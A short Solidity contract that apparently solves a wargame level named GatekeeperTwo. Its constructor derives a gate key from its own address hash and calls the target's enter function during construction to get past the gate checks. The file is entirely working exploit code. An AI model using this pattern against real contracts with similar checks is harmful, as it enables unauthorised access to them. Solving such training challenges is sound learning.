// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8) external returns (bool);
}

contract GatekeeperTwoAttacker {
    address public gatekeeperTwoAddress;
    bytes8 public gateKey;

    constructor(address _gatekeeperTwoAddress) {
        gatekeeperTwoAddress = _gatekeeperTwoAddress;
        gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max); 
        (bool result, ) = gatekeeperTwoAddress.call(
            abi.encodeWithSignature("enter(bytes8)", gateKey)
        );
        require(result, "Attack failed");
    }
}
